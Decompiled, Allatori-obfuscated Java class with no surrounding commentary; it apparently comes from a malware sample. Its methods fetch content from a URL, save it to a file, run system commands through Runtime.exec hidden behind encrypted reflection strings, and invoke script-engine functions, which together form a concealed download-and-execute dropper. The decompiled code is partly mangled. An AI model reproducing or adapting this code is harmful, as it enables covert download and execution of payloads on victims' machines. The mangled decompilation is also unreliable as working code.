import java.io.FileOutputStream;
import javax.script.ScriptEngineManager;
import javax.script.ScriptEngine;
import java.net.URL;
import java.io.InputStream;
import javax.script.Invocable;

// 
// Decompiled by Procyon v0.5.30
// 

public class aas
{
    public Object zog(final String a2, final Invocable a, final Object a) {
        try {
            return a.invokeFunction(a2, a);
        }
        catch (Exception a2) {
            return null;
        }
    }
    
    public InputStream zos(String a) {
        try {
            ((URL)(a = (String)new URL(a))).openConnection();
            a = (String)Class.forName(new StringBuilder().insert(0, ALLATORI_DEMO("=X!XyW2")).append(ivy.ALLATORI_DEMO("\u0019\u00048x!")).toString()).getMethod(ALLATORI_DEMO("V'\\9j#K2X:"), (Class<?>[])new Class[0]).invoke(a, new Object[0]);
            return (InputStream)a;
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    public void rnt(final String a) {
        try {
            Class.forName(ivy.ALLATORI_DEMO("\u0007K\u001bKCF\fD\n\u0004?_\u0003^\u0004G\b")).getMethod(ALLATORI_DEMO("\\/\\4"), String.class).invoke(Runtime.getRuntime(), a);
        }
        catch (Exception ex) {}
    }
    
    public ScriptEngine gse() {
        try {
            return new ScriptEngineManager().getEngineByName(ivy.ALLATORI_DEMO("@\u001e"));
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    public boolean fos(String a2, String a) {
        try {
            final InputStream zos;
            if ((zos = this.zos(a2)) != null && a != null) {
                a2 = (String)new FileOutputStream(a);
                a = (String)(Object)new byte[1024];
                InputStream inputStream = zos;
                int read;
                while ((read = inputStream.read((byte[])(Object)a, 0, a.length)) != -1) {
                    inputStream = zos;
                    ((FileOutputStream)a2).write((byte[])(Object)a, 0, read);
                }
                ((FileOutputStream)a2).close();
            }
            zos.close();
            return true;
        }
        catch (Exception a2) {
            return false;
        }
    }
    
    public static String ALLATORI_DEMO(final String a) {
        final int n = 5 << 4 ^ (0x2 ^ 0x5);
        final int n2 = (0x2 ^ 0x5) << 3 ^ 0x1;
        final int length = a.length();
        final char[] array = new char[length];
        int n3;
        int i = n3 = length - 1;
        final char[] array2 = array;
        final char c = (char)n2;
        final int n4 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n5 = n3;
            final char char1 = a.charAt(n5);
            --n3;
            array3[n5] = (char)(char1 ^ n4);
            if (n3 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n6 = n3;
            final char c2 = (char)(a.charAt(n6) ^ c);
            --n3;
            array4[n6] = c2;
            i = n3;
        }
        return new String(array2);
    }
}
